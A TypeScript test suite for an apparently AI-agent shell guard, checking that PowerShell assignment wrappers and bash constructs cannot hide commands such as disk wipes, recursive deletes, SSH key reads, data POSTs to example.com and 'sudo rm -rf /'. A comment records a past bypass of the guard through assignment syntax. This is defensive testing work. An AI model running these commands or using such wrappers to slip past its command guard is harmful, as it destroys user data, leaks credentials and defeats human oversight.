import assert from 'node:assert/strict';
import { mkdirSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { parseConfig } from '../src/config/store.ts';
import { openDatabase } from '../src/db/database.ts';
import { MIGRATIONS } from '../src/db/migrations.ts';
import { resolvePaths } from '../src/paths.ts';
import { PendingStore } from '../src/pending/store.ts';
import { ApprovalBroker } from '../src/tools/approvals.ts';
import { shellRun } from '../src/tools/builtin/shell.ts';
import { codeFindings } from '../src/tools/hooks/code-guard.ts';
import { outboundOf, pushesOf } from '../src/tools/hooks/outbound.ts';
import { segments } from '../src/tools/hooks/parse-cmd.ts';
import { realish } from '../src/tools/hooks/scope.ts';
import { checkShellCommand } from '../src/tools/hooks/shell-guard.ts';
import { lexShell } from '../src/tools/hooks/shell-lex.ts';
import { runToolCall } from '../src/tools/pipeline.ts';
import { buildPolicy, defaultWorkspace } from '../src/tools/policy.ts';
import { ToolRegistry } from '../src/tools/registry.ts';
import type { ToolContext, ToolDef } from '../src/tools/types.ts';
import { guardRowOf, looserThan, routeOf, type GuardModules } from './helpers/guard-route.ts';
import { tempDir, testConfig } from './helpers.ts';

// assign-guard: the right-hand side of a PowerShell assignment is a statement, so every guard rule sees the command there
// (`$r=Clear-Disk -Number 1` was read as an expression and ran with the judge off). Also: bash `sudo` that is not at the head
// of a line (`if x; then sudo …; fi`) is refused as guard.elevate. Nothing here is executed: the guard only, or the pipeline
// with a counting execute stub.

const MODS = { checkShellCommand, pushesOf, outboundOf } as unknown as GuardModules;

function workspace(t: { after: (fn: () => void) => void }): string {
  const ws = join(tempDir(t), 'workspace');
  mkdirSync(ws, { recursive: true });
  return realish(ws);
}

const COMMANDS = [
  'Clear-Disk -Number 1', 'Format-Volume -DriveLetter D', 'Remove-Item -Path C:/Users -Recurse -Force', 'Get-Content ~/.ssh/id_rsa',
  'git push --force origin main', 'Invoke-WebRequest https://example.com/x -Method Post -Body $b', 'Invoke-RestMethod -Uri https://example.com -OutFile x.ps1',
  'npm install left-pad', 'Stop-Computer',
];

// The third entry, when given, is the same place without the assignment: a command inside if ( ) is compared with if (C) itself
const ASSIGNS: Array<[string, (c: string) => string, ((c: string) => string)?]> = [
  ['$x=', c => `$r=${c}`],
  ['$x =', c => `$r =${c}`],
  ['$x= ', c => `$r= ${c}`],
  ['$x = ', c => `$r = ${c}`],
  ['$x+=', c => `$r+=${c}`],
  ['$x-=', c => `$r-=${c}`],
  ['[int]$x=', c => `[int]$r=${c}`],
  ['[string[]]$x =', c => `[string[]]$r = ${c}`],
  ['$a.b=', c => `$a.b=${c}`],
  ['$x[0]=', c => `$x[0]=${c}`],
  ['$x[$i].p=', c => `$x[$i].p=${c}`],
  ['$env:X=', c => `$env:X=${c}`],
  ['$script:X=', c => `$script:X=${c}`],
  ['$x = $y =', c => `$x = $y = ${c}`],
  ['$x=$y=', c => `$x=$y=${c}`],
  ['after ;', c => `Get-Date; $r=${c}`],
  ['newline', c => `Get-Date\n$r=${c}`],
  ['in try', c => `try { $r=${c} } catch {}`],
  ['in function', c => `function f { $r+=${c} }`],
  ['in if body', c => `if ($true) { $r=${c} }`],
  ['in if condition', c => `if ($r=${c}) { 1 }`, c => `if (${c}) { 1 }`],
  ['in while', c => `while ($true) { [int]$r=${c} }`],
  ['in $( )', c => `Write-Output $($r=${c})`],
  ['in script block', c => `1 | ForEach-Object { $r=${c} }`],
  ['in hashtable value', c => `@{ a = $r=${c} }`],
  // security review of 80145330: `?` in a variable name, `??=`, a static member, a quoted or computed member, a quoted index with `=`
  ['$x?=', c => `$x?=${c}`],
  ['$x??=', c => `$x??=${c}`],
  ['$x?+=', c => `$x?+=${c}`],
  ['$x? =', c => `$x? =${c}`],
  ['$x,$y?=', c => `$x,$y?=${c}`],
  ['$x ??= ', c => `$x ??= ${c}`],
  ['$x ??=', c => `$x ??=${c}`],
  ['[Environment]::P=', c => `[Environment]::CurrentDirectory=${c}`],
  ["$a.('b')=", c => `$a.('b')=${c}`],
  ["$a.'b'=", c => `$a.'b'=${c}`],
  ['$a."b"=', c => `$a."b"=${c}`],
  ["$h['a=b']=", c => `$h['a=b']=${c}`],
  ['$x?= in try', c => `try { $x?=${c} } catch {}`],
  // hashtable values glued to `=` (pre-existing: the value was dropped)
  ['@{a=C}', c => `@{a=${c}}`],
  ["@{'a'=C}", c => `@{'a'=${c}}`],
  ['@{a=C;b=1}', c => `@{a=${c};b=1}`],
  ['@{b=1;a=C}', c => `@{b=1;a=${c}}`],
  ['@{a =C}', c => `@{a =${c}}`],
  ['@{a= C}', c => `@{a= ${c}}`],
  ['@{ newline a=C }', c => `@{\nb=1\na=${c}\n}`],
  ['Write-Output @{a=C}', c => `Write-Output @{a=${c}}`],
  ['$x=@{a=C}', c => `$x=@{a=${c}}`],
];

test('assign: a command on the right of any PowerShell assignment is judged no more loosely than at top level (judge on and off)', t => {
  const ws = workspace(t);
  const wrong: string[] = [];
  for (const c of COMMANDS) {
    for (const [name, wrap, plain] of ASSIGNS) {
      const top = guardRowOf(MODS, plain ? plain(c) : c, 'powershell', ws);
      const row = guardRowOf(MODS, wrap(c), 'powershell', ws);
      const looser = looserThan(top, row);
      if (looser.length) wrong.push(`${name}: ${c} -> ${looser.join('; ')} (${row.decision} ${row.reasonKeys.join(',')})`);
    }
  }
  assert.deepEqual(wrong, []);
});

test('assign: a disk wipe on the right of an assignment is hard-denied in every form', t => {
  const ws = workspace(t);
  for (const [name, wrap] of ASSIGNS) {
    for (const c of ['Clear-Disk -Number 1', 'Initialize-Disk 1', 'diskpart']) {
      const row = guardRowOf(MODS, wrap(c), 'powershell', ws);
      assert.ok(row.reasonKeys.includes('guard.hard_denied'), `${name}: ${c} -> ${row.decision} ${row.reasonKeys.join(',')}`);
    }
  }
});

test('assign: the right-hand side is lexed as a command statement with its words', () => {
  for (const command of ['$r=Clear-Disk -Number 1', '$r =Clear-Disk -Number 1', '[int]$r=Clear-Disk -Number 1', '$a.b[0]=Clear-Disk -Number 1', '$env:X+=Clear-Disk -Number 1']) {
    const lexed = lexShell(command, 'powershell');
    assert.ok(lexed.ok, `${command}: ${lexed.ok ? '' : lexed.fail.code}`);
    const st = lexed.ok ? lexed.statements.find(s => s.kind === 'command') : undefined;
    assert.deepEqual(st?.words.map(w => w.text), ['Clear-Disk', '-Number', '1'], command);
  }
  for (const [command, text] of [['Write-Output $r=x', '$r=x'], ['Write-Output a$r=x', 'a$r=x'], ['Write-Output $a.b=[int]5', '$(…)=[int]5']] as const) {
    const lexed = lexShell(command, 'powershell');
    assert.ok(lexed.ok, command);
    assert.deepEqual(lexed.ok ? lexed.statements.map(s => s.words.map(w => w.text)) : [], [['Write-Output', text]], `${command}: an argument keeps its text`);
  }
});

test('assign: a typed left side keeps its cast mark (an unknown type is not silently allowed)', t => {
  const ws = workspace(t);
  const row = guardRowOf(MODS, '[System.Net.WebClient]$x = 1', 'powershell', ws);
  assert.ok(row.reasonKeys.includes('shape.cast'), row.reasonKeys.join(','));
});

test('assign: ordinary assignments stay as before', t => {
  const ws = workspace(t);
  for (const command of ['$x = 1', '$x=1', '$x = "a"', '$x=@(1,2)', '$x += 1', '[int]$x = 5', '$x = Get-ChildItem', '$x=Get-ChildItem', '$p = Join-Path $PWD out']) {
    const row = guardRowOf(MODS, command, 'powershell', ws);
    assert.notEqual(routeOf(row, { judgeOff: true }), 'refused', `${command} -> ${row.reasonKeys.join(',')}`);
    assert.notEqual(routeOf(row, { judgeOff: true }), 'owner', `${command} -> ${row.reasonKeys.join(',')}`);
  }
  // A glued operator (`$x=…`) was read as an expression before, so it keeps that judge reason: never looser than before
  // A variable name with `?` was read as `$a` and a `?` word before, so it keeps that judge reason too
  for (const command of ['$x=1', '$x=Get-ChildItem', '$x+=Get-ChildItem', '$a.b=Get-ChildItem', '[int]$x = 5', '$a?', '$a?.b', '$a?[0]', '$a?[0].b', '$x? = 1', '$x ??= 1']) {
    const row = guardRowOf(MODS, command, 'powershell', ws);
    assert.ok(row.reasonKeys.includes('shape.expr'), `${command} -> ${row.reasonKeys.join(',')}`);
  }
  // The automatic variable `$?` is not such a name: it stays as before
  for (const command of ['$?', 'Write-Output $?']) {
    const row = guardRowOf(MODS, command, 'powershell', ws);
    assert.ok(!row.reasonKeys.includes('shape.expr'), `${command} -> ${row.reasonKeys.join(',')}`);
  }
  // `$x =Cmd` gave code.unknown_target before (the code check read `$x` as the program); the right side is checked now, and that mark stays
  const spaced = guardRowOf(MODS, '$r =Get-ChildItem', 'powershell', ws);
  assert.ok(spaced.reasonKeys.includes('code.unknown_target'), spaced.reasonKeys.join(','));
});

// Recorded relaxations against base 479d6e14 (plans/beat/steps/control-bodies/deviations.md, assign-guard): head reads these as PowerShell does.
// (a) base misread `=@` + `{…}` as a command and a script block; a hashtable of plain values is now an expression (judge).
// (b) base refused `#` after a glued `=`; PowerShell reads `a#b` there as one generic token, not a comment.
// The decisions are pinned so any further change shows up here: [command, route with the judge on, route with the judge off, decision]
const RELAXED: Array<[string, string, string, string]> = [
  ['$x=@{a=1}', 'judge', 'allow', 'ask'],
  ['$p=@{Path=$f}', 'judge', 'allow', 'ask'],
  ['$x=a#b', 'product', 'product', 'ask'],
  ['$x=Remove-Item a#b', 'owner', 'owner', 'ask'],
  ['Write-Output $x=a#b', 'allow', 'allow', 'allow'],
];

test('assign: recorded relaxations keep their pinned decisions, and a command inside such a hashtable is still refused', t => {
  const ws = workspace(t);
  for (const [command, on, off, decision] of RELAXED) {
    const row = guardRowOf(MODS, command, 'powershell', ws);
    assert.deepEqual([routeOf(row, { judgeOff: false }), routeOf(row, { judgeOff: true }), row.decision], [on, off, decision], `${command} -> ${row.reasonKeys.join(',')}`);
  }
  for (const command of ['$x=@{a=Stop-Computer}', '@{a=Stop-Computer}', "@{'a'=Stop-Computer}", '@{a=Restart-Computer;b=1}', 'Write-Output @{a=Stop-Computer}', '@{a = Stop-Computer}']) {
    const row = guardRowOf(MODS, command, 'powershell', ws);
    assert.equal(row.decision, 'deny', `${command} -> ${row.reasonKeys.join(',')}`);
  }
});

test('assign: the code check alone reads the right side after a quoted index and after ??=', t => {
  const ws = workspace(t);
  const keys = (command: string): string[] => segments(command).flatMap(seg => codeFindings(seg, { cwd: ws, language: 'en', selfHosts: [] })).map(found => found.key);
  assert.ok(keys('npm install left-pad').includes('code.project_tool'));
  for (const command of ["$h['a=b']=npm install left-pad", '$x ??=npm install left-pad', '$x ??= npm install left-pad']) {
    assert.ok(keys(command).includes('code.project_tool'), `${command} -> ${keys(command).join(',')}`);
  }
});

test('elevate: bash sudo / doas / su / pkexec anywhere a command runs is refused as guard.elevate', t => {
  const ws = workspace(t);
  for (const command of [
    'if true; then sudo ls; fi', 'if x; then sudo rm -rf /; fi', 'while x; do sudo ls; done', '{ sudo ls; }', '( sudo ls )', 'X=1 sudo ls',
    'x=$(sudo ls)', 'echo $(doas ls)', 'for i in 1; do pkexec ls; done', '/usr/bin/sudo ls', 'case a in a) su root;; esac', 'f() { sudo ls; }',
  ]) {
    const row = guardRowOf(MODS, command, 'bash', ws);
    assert.ok(row.reasonKeys.includes('guard.elevate'), `${command} -> ${row.decision} ${row.reasonKeys.join(',')}`);
    assert.equal(row.decision, 'deny', command);
  }
  for (const command of ['echo sudo', 'grep -r sudo .', 'ls sudo-notes']) {
    const row = guardRowOf(MODS, command, 'bash', ws);
    assert.ok(!row.reasonKeys.includes('guard.elevate'), `${command} -> ${row.reasonKeys.join(',')}`);
  }
});

function world(t: { after: (fn: () => void) => void }, judgeMode: 'on' | 'off') {
  const paths = resolvePaths(tempDir(t));
  mkdirSync(paths.workspace, { recursive: true });
  const config = testConfig();
  config.tools.roots = [{ path: 'workspace', mode: 'write' }];
  config.routing.judgeMode = judgeMode;
  const parsed = parseConfig(config);
  const db = openDatabase(':memory:', MIGRATIONS);
  let ran = 0;
  const stubbed: ToolDef = { ...(shellRun as unknown as ToolDef), execute: async () => { ran++; return { content: 'ran' }; } };
  const registry = new ToolRegistry().register(stubbed);
  const pending = new PendingStore(db, { tools: registry, dataDir: paths.data });
  const policy = buildPolicy(parsed, paths);
  const ws = defaultWorkspace(policy, paths);
  const ctx: ToolContext = {
    runId: 'r1', conversationId: 'c1', kind: 'chat', signal: new AbortController().signal, config: parsed, paths, policy,
    workspace: ws, taint: { tainted: false, sources: [] }, log: () => undefined, permissionMode: 'auto', project: { id: 'p1', root: ws },
  };
  const deps = {
    registry, approvals: new ApprovalBroker(db), pending, db, emit: () => undefined, lastUserRequest: () => 'clean up the project',
    config: () => parsed, permissionMode: () => 'auto' as const,
  };
  const run = (command: string) => runToolCall({ id: `call-${Math.random()}`, name: 'shell_run', arguments: { command } }, ctx, deps);
  return { run, ran: () => ran };
}

test('assign: through the pipeline with the judge off, a disk wipe on the right of an assignment is refused and never runs; an ordinary one runs', async t => {
  const w = world(t, 'off');
  for (const command of ['$r=Clear-Disk -Number 1', '$r+=Clear-Disk -Number 1', '[int]$r=Clear-Disk -Number 1', '$env:X=Clear-Disk -Number 1', '$x?=Stop-Computer', '@{a=Stop-Computer}', '$x=@{a=Stop-Computer}']) {
    const out = await w.run(command);
    assert.equal(out.decision, 'deny', `${command} -> ${out.decidedBy}: ${out.output.content}`);
    assert.notEqual(out.decidedBy, 'pending', command);
  }
  assert.equal(w.ran(), 0);
  const ok = await w.run('$x=Get-ChildItem');
  assert.equal(w.ran(), 1, `${ok.decidedBy}: ${ok.output.content}`);
});
